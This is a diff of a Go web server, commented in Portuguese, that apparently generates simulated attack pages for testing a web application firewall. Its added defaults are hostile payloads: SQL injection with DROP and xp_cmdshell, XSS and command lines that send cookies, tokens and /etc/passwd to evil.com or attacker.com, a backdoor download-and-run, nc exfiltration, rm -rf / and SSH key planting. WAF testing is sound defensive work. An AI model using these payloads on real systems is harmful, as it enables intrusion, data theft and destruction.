@@ -1,14 +1,11 @@
 package main
 
 import (
-	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
 	"strings"
-	"time"
 )
 
 // Response representa a estrutura de resposta da API
@@ -190,15 +187,37 @@ func setupRoutes() {
 
 // Handler para SQL Injection com alta pontuação de anomalia
 func handleSQLInjection(w http.ResponseWriter, r *http.Request) {
+	// Obter múltiplos parâmetros para aumentar a detecção pelo WAF
 	id := r.URL.Query().Get("id")
+	table := r.URL.Query().Get("table")
+	column := r.URL.Query().Get("column")
+	order := r.URL.Query().Get("order")
+	limit := r.URL.Query().Get("limit")
+	
+	// Valores padrão maliciosos se não forem fornecidos
 	if id == "" {
 		id = "1' UNION SELECT username,password,uid,gid FROM users WHERE '1'='1; DROP TABLE users; INSERT INTO admin VALUES ('hacker','hacker'); --"
 	}
-	log.Printf("SQL Injection Test - ID: %s", id)
+	if table == "" {
+		table = "users; DROP DATABASE security; --"
+	}
+	if column == "" {
+		column = "id,username,password FROM users WHERE 1=1 UNION ALL SELECT null,table_name,column_name FROM information_schema.columns; --"
+	}
+	if order == "" {
+		order = "1; UPDATE users SET admin=1 WHERE username LIKE '%admin%'; --"
+	}
+	if limit == "" {
+		limit = "10; EXEC xp_cmdshell('net user hacker Password123 /add'); --"
+	}
+	
+	log.Printf("SQL Injection Test - ID: %s, Table: %s, Column: %s, Order: %s, Limit: %s", 
+		id, table, column, order, limit)
 	
 	title := "Teste de SQL Injection"
 	description := "Este teste simula uma tentativa de injeção SQL que poderia permitir acesso não autorizado a dados, modificação de dados ou comprometimento do banco de dados."
-	payload := fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", id)
+	payload := fmt.Sprintf("SELECT %s FROM %s WHERE id = '%s' ORDER BY %s LIMIT %s", 
+		column, table, id, order, limit)
 	attackType := "SQL Injection"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
@@ -206,15 +225,37 @@ func handleSQLInjection(w http.ResponseWriter, r *http.Request) {
 
 // Handler para XSS com alta pontuação de anomalia
 func handleXSS(w http.ResponseWriter, r *http.Request) {
+	// Obter múltiplos parâmetros para aumentar a detecção pelo WAF
 	name := r.URL.Query().Get("name")
+	comment := r.URL.Query().Get("comment")
+	profile := r.URL.Query().Get("profile")
+	redirect := r.URL.Query().Get("redirect")
+	theme := r.URL.Query().Get("theme")
+	
+	// Valores padrão maliciosos se não forem fornecidos
 	if name == "" {
 		name = "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))><iframe/src=\"javascript:alert(`${document.cookie}`)\">"
 	}
-	log.Printf("XSS Test - Name: %s", name)
+	if comment == "" {
+		comment = "<img src=x onerror=\"fetch('https://evil.com/steal?cookie='+document.cookie)\">"
+	}
+	if profile == "" {
+		profile = "<script>var img=new Image();img.src='https://attacker.com/steal?data='+document.cookie;</script>"
+	}
+	if redirect == "" {
+		redirect = "javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"
+	}
+	if theme == "" {
+		theme = "default');document.location='https://evil.com/phish?token='+localStorage.getItem('auth_token');//"
+	}
+	
+	log.Printf("XSS Test - Name: %s, Comment: %s, Profile: %s, Redirect: %s, Theme: %s", 
+		name, comment, profile, redirect, theme)
 	
 	title := "Teste de Cross-Site Scripting (XSS)"
 	description := "Este teste simula uma tentativa de injeção de scripts maliciosos que poderiam ser executados no navegador de outros usuários, permitindo roubo de sessões, redirecionamentos maliciosos ou outras ações não autorizadas."
-	payload := name
+	payload := fmt.Sprintf("Nome: %s<br>Comentário: %s<br>Perfil: %s<br>Redirecionamento: %s<br>Tema: %s", 
+		name, comment, profile, redirect, theme)
 	attackType := "Cross-Site Scripting"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
@@ -222,15 +263,37 @@ func handleXSS(w http.ResponseWriter, r *http.Request) {
 
 // Handler para Command Injection com alta pontuação de anomalia
 func handleCommandInjection(w http.ResponseWriter, r *http.Request) {
+	// Obter múltiplos parâmetros para aumentar a detecção pelo WAF
 	host := r.URL.Query().Get("host")
+	cmd := r.URL.Query().Get("cmd")
+	file := r.URL.Query().Get("file")
+	path := r.URL.Query().Get("path")
+	user := r.URL.Query().Get("user")
+	
+	// Valores padrão maliciosos se não forem fornecidos
 	if host == "" {
 		host = "localhost;cat /etc/passwd;id;uname -a;ls -la;wget http://malicious.com/backdoor -O /tmp/backdoor;chmod +x /tmp/backdoor;/tmp/backdoor"
 	}
-	log.Printf("Command Injection Test - Host: %s", host)
+	if cmd == "" {
+		cmd = "ls -la & echo 'PWNED' & cat /etc/shadow & curl -X POST -d @/etc/passwd https://attacker.com/exfil"
+	}
+	if file == "" {
+		file = "/etc/passwd | grep -v 'nologin' | awk -F: '{print $1\":\"$7}' | nc attacker.com 8888"
+	}
+	if path == "" {
+		path = "/var/www/html; rm -rf /; echo 'HACKED' > index.html"
+	}
+	if user == "" {
+		user = "admin & echo 'ssh-rsa AAAAB...' >> ~/.ssh/authorized_keys"
+	}
+	
+	log.Printf("Command Injection Test - Host: %s, Cmd: %s, File: %s, Path: %s, User: %s", 
+		host, cmd, file, path, user)
 	
 	title := "Teste de Command Injection"
 	description := "Este teste simula uma tentativa de injeção de comandos do sistema operacional que poderiam ser executados no servidor, permitindo acesso não autorizado a arquivos, execução de programas maliciosos ou comprometimento do sistema."
-	payload := fmt.Sprintf("ping -c 1 %s", host)
+	payload := fmt.Sprintf("ping -c 1 %s && %s && cat %s && cd %s && su %s", 
+		host, cmd, file, path, user)
 	attackType := "Command Injection"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
@@ -239,14 +302,29 @@ func handleCommandInjection(w http.ResponseWriter, r *http.Request) {
 // Handler para Path Traversal com alta pontuação de anomalia
 func handlePathTraversal(w http.ResponseWriter, r *http.Request) {
 	file := r.URL.Query().Get("file")
+	depth := r.URL.Query().Get("depth")
+	type_param := r.URL.Query().Get("type")
+	encoding := r.URL.Query().Get("encoding")
+	
 	if file == "" {
 		file = "../../../../../../../etc/passwd%00.jpg"
 	}
-	log.Printf("Path Traversal Test - File: %s", file)
+	if depth == "" {
+		depth = "../../../../../../../../"
+	}
+	if type_param == "" {
+		type_param = "php://filter/convert.base64-encode/resource=/etc/passwd"
+	}
+	if encoding == "" {
+		encoding = "%252e%252e%252f%252e%252e%252f%252e%252e%252f"
+	}
+	
+	log.Printf("Path Traversal Test - File: %s, Depth: %s, Type: %s, Encoding: %s", 
+		file, depth, type_param, encoding)
 	
 	title := "Teste de Path Traversal"
 	description := "Este teste simula uma tentativa de acesso a arquivos fora do diretório permitido, o que poderia expor arquivos sensíveis do sistema, configurações ou dados privados."
-	payload := fmt.Sprintf("open('%s', 'r')", file)
+	payload := fmt.Sprintf("open('%s%s%s', 'r', '%s')", depth, type_param, file, encoding)
 	attackType := "Path Traversal"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
@@ -255,14 +333,29 @@ func handlePathTraversal(w http.ResponseWriter, r *http.Request) {
 // Handler para Local File Inclusion (LFI) com alta pontuação de anomalia
 func handleLFI(w http.ResponseWriter, r *http.Request) {
 	page := r.URL.Query().Get("page")
+	wrapper := r.URL.Query().Get("wrapper")
+	filter := r.URL.Query().Get("filter")
+	protocol := r.URL.Query().Get("protocol")
+	
 	if page == "" {
 		page = "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
 	}
-	log.Printf("LFI Test - Page: %s", page)
+	if wrapper == "" {
+		wrapper = "php://filter/convert.base64-encode/resource="
+	}
+	if filter == "" {
+		filter = "expect://id"
+	}
+	if protocol == "" {
+		protocol = "file:///etc/passwd"
+	}
+	
+	log.Printf("LFI Test - Page: %s, Wrapper: %s, Filter: %s, Protocol: %s", 
+		page, wrapper, filter, protocol)
 	
 	title := "Teste de Local File Inclusion"
 	description := "Este teste simula uma tentativa de inclusão de arquivos locais não autorizados, o que poderia permitir a execução de código malicioso, acesso a informações sensíveis ou comprometimento do sistema."
-	payload := fmt.Sprintf("include('%s')", page)
+	payload := fmt.Sprintf("include('%s%s'); include('%s'); include('%s');", wrapper, page, filter, protocol)
 	attackType := "Local File Inclusion"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
@@ -271,14 +364,34 @@ func handleLFI(w http.ResponseWriter, r *http.Request) {
 // Handler para API Test com alta pontuação de anomalia
 func handleAPITest(w http.ResponseWriter, r *http.Request) {
 	apiKey := r.URL.Query().Get("api_key")
+	token := r.URL.Query().Get("token")
+	auth := r.URL.Query().Get("auth")
+	secret := r.URL.Query().Get("secret")
+	access := r.URL.Query().Get("access")
+	
 	if apiKey == "" {
 		apiKey = "sk_test_12345' OR 1=1; DROP TABLE users; --"
 	}
-	log.Printf("API Test - API Key: %s", apiKey)
+	if token == "" {
+		token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkhhY2tlciIsImFkbWluIjp0cnVlfQ"
+	}
+	if auth == "" {
+		auth = "Basic YWRtaW46YWRtaW4=" // admin:admin em Base64
+	}
+	if secret == "" {
+		secret = "client_secret=test' UNION SELECT * FROM users; --"
+	}
+	if access == "" {
+		access = "Bearer STOLEN_TOKEN' OR 1=1; --"
+	}
+	
+	log.Printf("API Test - API Key: %s, Token: %s, Auth: %s, Secret: %s, Access: %s", 
+		apiKey, token, auth, secret, access)
 	
 	title := "Teste de API Security"
 	description := "Este teste simula uma tentativa de manipulação de parâmetros de API que poderiam permitir acesso não autorizado, vazamento de dados ou comprometimento da segurança da API."
-	payload := fmt.Sprintf("Authorization: Bearer %s", apiKey)
+	payload := fmt.Sprintf("Authorization: Bearer %s\nX-API-Key: %s\nAuthorization: %s\nClient-Secret: %s\nAccess-Token: %s", 
+		apiKey, token, auth, secret, access)
 	attackType := "API Security"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
@@ -286,43 +399,60 @@ func handleAPITest(w http.ResponseWriter, r *http.Request) {
 
 // Handler para API POST com alta pontuação de anomalia
 func handleAPIPost(w http.ResponseWriter, r *http.Request) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "Método não permitido", http.StatusMethodNotAllowed)
-		return
-	}
+	title := "Teste de API POST Security"
+	description := "Este teste simula uma tentativa de manipulação de parâmetros em uma requisição POST para API, o que poderia permitir injeção de dados maliciosos, acesso não autorizado ou comprometimento da segurança da API."
+	payload := `{
+  "user": {"$ne": null, "$exists": true, "$in": ["admin", "root"]},
+  "password": {"$regex": ".*", "$options": "i"},
+  "$where": "function() { return this.admin === true || this.isAdmin === true; }",
+  "token": "' OR '1'='1; DROP TABLE users; --",
+  "query": {"$gt": {"$where": "db.collection.drop()"}},
+  "projection": {"$function": {"body": "function() { return db.getCollectionNames(); }"}},
+  "filter": {"$jsonSchema": {"required": ["admin"], "properties": {"admin": {"enum": [true]}}}},
+  "update": {"$set": {"admin": true, "role": "superuser"}}
+}`
+	attackType := "API POST Security"
 	
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Erro ao ler o corpo da requisição", http.StatusBadRequest)
-		return
-	}
-	defer r.Body.Close()
-	
-	log.Printf("API POST Test - Body: %s", string(body))
-	
-	// Resposta JSON
-	response := Response{
-		Status:  "success",
-		Message: "Teste de segurança de API POST realizado com sucesso",
-		Data:    map[string]interface{}{"timestamp": time.Now().Unix(), "server": getHostname()},
-	}
-	
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(response)
+	renderTemplate(w, r, title, description, payload, attackType)
 }
 
 // Handler para Combined Attack com alta pontuação de anomalia
 func handleCombinedAttack(w http.ResponseWriter, r *http.Request) {
 	input := r.URL.Query().Get("input")
+	sql_part := r.URL.Query().Get("sql")
+	xss_part := r.URL.Query().Get("xss")
+	cmd_part := r.URL.Query().Get("cmd")
+	lfi_part := r.URL.Query().Get("lfi")
+	
 	if input == "" {
-		input = "1'; DROP TABLE users; INSERT INTO users VALUES ('hacker','password'); SELECT * FROM users WHERE name LIKE '%admin%'; <script>console.log('Tentativa de XSS detectada')</script>; cat /etc/passwd; ../../../etc/shadow"
+		input = "' OR 1=1; DROP TABLE users; --><script>alert(document.cookie)</script>"
 	}
-	log.Printf("Combined Attack Test - Input: %s", input)
+	if sql_part == "" {
+		sql_part = "UNION SELECT username,password FROM users WHERE 1=1; --"
+	}
+	if xss_part == "" {
+		xss_part = "<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>"
+	}
+	if cmd_part == "" {
+		cmd_part = "; cat /etc/passwd | curl -d @- https://attacker.com/exfil"
+	}
+	if lfi_part == "" {
+		lfi_part = "php://filter/convert.base64-encode/resource=/etc/passwd"
+	}
+	
+	log.Printf("Combined Attack Test - Input: %s, SQL: %s, XSS: %s, CMD: %s, LFI: %s", 
+		input, sql_part, xss_part, cmd_part, lfi_part)
 	
 	title := "Teste de Ataque Combinado"
-	description := "Este teste simula uma tentativa de ataque que combina múltiplos vetores (SQL Injection, XSS, Command Injection e Path Traversal) para maximizar as chances de sucesso e aumentar a pontuação de anomalia."
-	payload := input
-	attackType := "Ataque Combinado"
+	description := "Este teste simula um ataque que combina múltiplas técnicas (SQL Injection, XSS, etc.) em um único payload, o que poderia aumentar as chances de sucesso ao tentar contornar mecanismos de segurança."
+	payload := fmt.Sprintf(`
+SQL: SELECT * FROM users WHERE username = '%s %s';
+EXEC: system("%s %s");
+INCLUDE: include("%s %s");
+HTML: <div>%s %s</div>
+COOKIE: document.cookie="%s; path=/; domain=.example.com"
+	`, input, sql_part, input, cmd_part, input, lfi_part, input, xss_part, input)
+	attackType := "Combined Attack"
 	
 	renderTemplate(w, r, title, description, payload, attackType)
 }
